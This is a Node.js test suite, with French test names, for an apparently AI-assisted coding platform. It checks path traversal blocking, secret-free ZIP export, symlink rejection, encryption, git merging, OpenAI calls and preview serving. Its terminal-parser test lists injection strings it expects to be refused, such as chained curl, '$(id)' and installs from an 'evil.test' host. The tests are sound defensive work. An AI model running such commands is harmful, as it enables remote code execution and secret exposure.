const {test}=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),ts=require('typescript');
require.extensions['.ts']=(m,file)=>m._compile(ts.transpileModule(fs.readFileSync(file,'utf8'),{compilerOptions:{module:ts.ModuleKind.CommonJS,target:ts.ScriptTarget.ES2022,esModuleInterop:true}}).outputText,file);
const {editablePath}=require('../src/lib/project-files.ts'),{readArchive,projectZip}=require('../src/lib/project-archive.ts'),{seal,unseal}=require('../src/lib/secret-box.ts');
test('refuse les chemins traversants, secrets et fichiers générés',()=>{for(const p of ['../secret','/root/key','a\\b','a//b','a/constructor/x','.env.production','.git/config','private.key'])assert.throws(()=>editablePath(p));assert.equal(editablePath('src/app.tsx'),'src/app.tsx');assert.equal(editablePath('.env.example'),'.env.example');});
test('ZIP réel préserve les octets binaires et exécutables sans exporter les secrets',async()=>{const archive=await projectZip([{path:'bin/run.sh',content:'#!/bin/sh\necho ok',encoding:'utf8',mode:'100755'},{path:'assets/icon.bin',content:Buffer.from([0,255,1]).toString('base64'),encoding:'base64'},{path:'.env',content:'secret',encoding:'utf8'}]);const result=await readArchive(archive);assert.equal(result.files.length,2);assert.equal(result.files.find(f=>f.path==='bin/run.sh').mode,'100755');assert.deepEqual(Buffer.from(result.files.find(f=>f.path==='assets/icon.bin').content,'base64'),Buffer.from([0,255,1]));});
test('refuse les liens symboliques des archives',async()=>{const JSZip=require('jszip'),z=new JSZip();z.file('link','../../etc/passwd',{unixPermissions:0o120777});await assert.rejects(readArchive(await z.generateAsync({type:'nodebuffer',platform:'UNIX'})),/symboliques/);});
test('chiffrement authentifié des intégrations : altération et mauvaise clé refusées',()=>{process.env.INTEGRATION_ENCRYPTION_KEY=Buffer.alloc(32,5).toString('base64');const value=seal('test-token');assert.equal(unseal(value),'test-token');const bytes=Buffer.from(value,'base64');bytes[15]^=1;assert.throws(()=>unseal(bytes.toString('base64')));process.env.INTEGRATION_ENCRYPTION_KEY=Buffer.alloc(32,6).toString('base64');assert.throws(()=>unseal(value));});
const {mergeGitFiles,snapshotDigest}=require('../src/lib/git-sync.ts');
const textFile=(path,content,mode='100644')=>({path,content,encoding:'utf8',mode});
test('synchronisation GitHub préserve les modifications indépendantes et détecte les conflits',()=>{
 const base=[textFile('a.txt','a'),textFile('b.txt','b')];
 const merged=mergeGitFiles(base,[textFile('a.txt','local'),base[1]],[base[0],textFile('b.txt','remote')]);
 assert.deepEqual(merged.conflicts,[]);assert.deepEqual(merged.files.map(f=>f.content),['local','remote']);
 assert.deepEqual(mergeGitFiles(base,[textFile('a.txt','local'),base[1]],[textFile('a.txt','remote'),base[1]]).conflicts,['a.txt']);
 assert.deepEqual(mergeGitFiles(base,base,[base[1]]).files,[base[1]]);
 assert.deepEqual(mergeGitFiles(base,[textFile('a.txt','edited'),base[1]],[base[1]]).conflicts,['a.txt']);
 assert.equal(snapshotDigest(base),snapshotDigest([...base].reverse()));
 assert.notEqual(snapshotDigest(base),snapshotDigest([textFile('a.txt','a','100755'),base[1]]));
});
test('sélection IA stricte sans clé exposée ni changement silencieux de moteur',()=>{
 const {aiProviders,selectProvider}=require('../src/lib/ai-providers.ts');
 const old={key:process.env.OPENAI_API_KEY,model:process.env.OPENAI_CODEX_MODEL};
 try{delete process.env.OPENAI_API_KEY;delete process.env.OPENAI_CODEX_MODEL;assert.equal(selectProvider('codex'),'codex');assert.throws(()=>selectProvider('gemini'),/OpenAI/);assert.throws(()=>selectProvider('unknown'),/OpenAI/);process.env.OPENAI_API_KEY='test-only';process.env.OPENAI_CODEX_MODEL='configured-model';assert.equal(selectProvider('codex'),'codex');assert.equal(JSON.stringify(aiProviders()).includes('test-only'),false);}finally{for(const [name,v]of [['OPENAI_API_KEY',old.key],['OPENAI_CODEX_MODEL',old.model]])if(v===undefined)delete process.env[name];else process.env[name]=v;}
});
test('OpenAI Responses utilise le modèle configuré, sans stockage ni outils arbitraires',async()=>{
 const {openaiCoding}=require('../src/lib/openai-coding.ts');const original=global.fetch,previousKey=process.env.OPENAI_API_KEY,previousModel=process.env.OPENAI_CODEX_MODEL;
 process.env.OPENAI_API_KEY='test-not-a-real-key';process.env.OPENAI_CODEX_MODEL='configured-coding-model';
 try{global.fetch=async(url,options)=>{assert.equal(url,'https://api.openai.com/v1/responses');assert.equal(options.redirect,'error');const payload=JSON.parse(options.body);assert.equal(payload.model,'configured-coding-model');assert.equal(payload.store,false);assert.equal(payload.tools,undefined);return Response.json({status:'completed',output:[{type:'message',content:[{type:'output_text',text:'{"message":"ok","files":[]}'}]}]});};assert.match(await openaiCoding('instructions',[{role:'user',content:[{type:'input_text',text:'code'}]}]),/"message":"ok"/);
 global.fetch=async()=>Response.json({status:'incomplete',output:[]});await assert.rejects(openaiCoding('x',[]),/incomplète/);
 global.fetch=async()=>Response.json({error:{message:'upstream secret details'}},{status:401});await assert.rejects(openaiCoding('x',[]),e=>!/secret details/.test(e.message)&&/refusé/.test(e.message));
 }finally{global.fetch=original;if(previousKey===undefined)delete process.env.OPENAI_API_KEY;else process.env.OPENAI_API_KEY=previousKey;if(previousModel===undefined)delete process.env.OPENAI_CODEX_MODEL;else process.env.OPENAI_CODEX_MODEL=previousModel;}
});

const {PNG}=require('pngjs'),{trimLogo}=require('../src/lib/logo-image.ts');
test('logo PNG conserve la transparence et recadre les marges',()=>{const source=new PNG({width:128,height:128});source.data.fill(0);for(let y=50;y<70;y++)for(let x=40;x<80;x++){const i=(y*128+x)*4;source.data[i]=120;source.data[i+2]=230;source.data[i+3]=255;}const trimmed=PNG.sync.read(trimLogo(PNG.sync.write(source)));assert.equal(trimmed.width,48);assert.equal(trimmed.height,28);assert.equal(trimmed.data[3],0);assert.throws(()=>trimLogo(Buffer.from('invalid')),/PNG/);const huge=PNG.sync.write(source);huge.writeUInt32BE(100000,16);assert.throws(()=>trimLogo(huge),/Dimensions/);});
test('flux OpenAI fournit les vraies propositions et refuse un flux interrompu',async()=>{const {openaiCoding}=require('../src/lib/openai-coding.ts');const original=global.fetch;const frames=[{type:'response.output_text.delta',delta:'{"message":"ok",'},{type:'response.output_text.delta',delta:'"files":[]}'},{type:'response.completed',response:{status:'completed',output:[{type:'message',content:[{type:'output_text',text:'{"message":"ok","files":[]}'}]}]}}];let progress=[];try{global.fetch=async()=>new Response(frames.map(e=>'data: '+JSON.stringify(e)+'\n\n').join(''),{headers:{'Content-Type':'text/event-stream'}});assert.equal(await openaiCoding('x',[],{apiKey:'test',model:'test',onProgress:async text=>{progress.push(text)}}),'{'+'"message":"ok","files":[]}');assert.equal(progress.length,2);global.fetch=async()=>new Response('data: '+JSON.stringify(frames[0])+'\n\n',{headers:{'Content-Type':'text/event-stream'}});await assert.rejects(openaiCoding('x',[],{apiKey:'test',model:'test'}),/incomplète/);}finally{global.fetch=original;}});
const {parseCommand}=require('../server/runtime/commands.cjs');
test('terminal npm valide paquets et scripts sans ouvrir un shell',()=>{
 assert.equal(parseCommand('npm install').action,'install');assert.deepEqual(parseCommand('npm install --save-dev typescript@5.5.3').packages,['typescript@5.5.3']);assert.equal(parseCommand('npm run build').script,'build');assert.equal(parseCommand('npm test').script,'test');
 for(const command of ['bash','npm install x; curl x','npm install https://evil.test/a.tgz','npm install --registry=https://evil.test','npm run build && ls','npm install $(id)','npm run build\nls','npm install file:../secret','npm run build -- --flag'])assert.throws(()=>parseCommand(command));
});
const {resolvePreviewAsset,previewFiles}=require('../src/lib/preview-assets.ts');
test('WebView publique sert uniquement HTML et ressources référencées, y compris CSS relatif',()=>{
 const files=[{path:'index.html',content:'<link href="css/main.css"><script src="app.js"></script>',encoding:'utf8'},{path:'css/main.css',content:'body{background:url(../images/logo.png)}',encoding:'utf8'},{path:'images/logo.png',content:'AA==',encoding:'base64'},{path:'app.js',content:'console.log("app")',encoding:'utf8'},{path:'private-settings.json',content:'{"private":true}',encoding:'utf8'},{path:'.env',content:'SECRET',encoding:'utf8'}];
 const served=previewFiles(files,false).map(f=>f.path);assert.ok(served.includes('css/main.css'));assert.ok(served.includes('images/logo.png'));assert.ok(served.includes('app.js'));assert.ok(!served.includes('private-settings.json'));assert.ok(!served.includes('.env'));
 assert.equal(resolvePreviewAsset('css/main.css','../images/logo.png?v=1'),'images/logo.png');assert.equal(resolvePreviewAsset('index.html','../../secret'),null);assert.equal(resolvePreviewAsset('index.html','https://example.com/a'),null);
});
const {generationPreview}=require('../src/lib/generation-preview.ts');
test('aperçu du chat suit les chaînes JSON réellement reçues sans inventer de fichier',()=>{const p=generationPreview('{"message":"Bonjour\\nSuite","files":[{"path":"src/a.ts","content":"export const a=1;\\n');assert.equal(p.messagePreview,'Bonjour\nSuite');assert.equal(p.filePreview.path,'src/a.ts');assert.equal(p.filePreview.content,'export const a=1;\n');assert.deepEqual(generationPreview(''),{messagePreview:'',filePreview:{path:'',content:''}});});
